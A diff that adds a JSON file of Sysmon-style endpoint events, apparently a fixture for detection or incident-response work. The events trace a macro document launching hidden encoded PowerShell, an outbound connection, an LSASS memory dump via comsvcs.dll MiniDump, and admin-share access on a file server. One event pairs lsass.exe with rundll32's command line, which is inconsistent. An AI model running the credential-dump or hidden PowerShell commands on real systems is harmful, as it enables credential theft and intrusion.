@@ -1,0 +1,43 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-06-24T09:02:11Z",
+    "Computer": "FIN-LAPTOP-12",
+    "Image": "C:\\Windows\\System32\\WINWORD.EXE",
+    "CommandLine": "WINWORD.EXE /n \"Invoice_2026_0614.docm\"",
+    "User": "FIN-LAPTOP-12\\sguerra"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-06-24T09:02:47Z",
+    "Computer": "FIN-LAPTOP-12",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
+    "User": "FIN-LAPTOP-12\\sguerra"
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2026-06-24T09:03:05Z",
+    "Computer": "FIN-LAPTOP-12",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "10.0.8.41",
+    "DestinationIp": "194.61.55.18",
+    "User": "FIN-LAPTOP-12\\sguerra"
+  },
+  {
+    "EventID": 10,
+    "UtcTime": "2026-06-24T09:06:22Z",
+    "Computer": "FIN-LAPTOP-12",
+    "Image": "C:\\Windows\\System32\\lsass.exe",
+    "CommandLine": "rundll32.exe C:\\Windows\\Temp\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass_dump.bin full",
+    "User": "FIN-LAPTOP-12\\sguerra"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-06-24T09:11:40Z",
+    "Computer": "FIN-LAPTOP-12",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net use \\\\DC-FILESRV01\\C$ /user:CORP\\sguerra",
+    "User": "FIN-LAPTOP-12\\sguerra"
+  }
+]
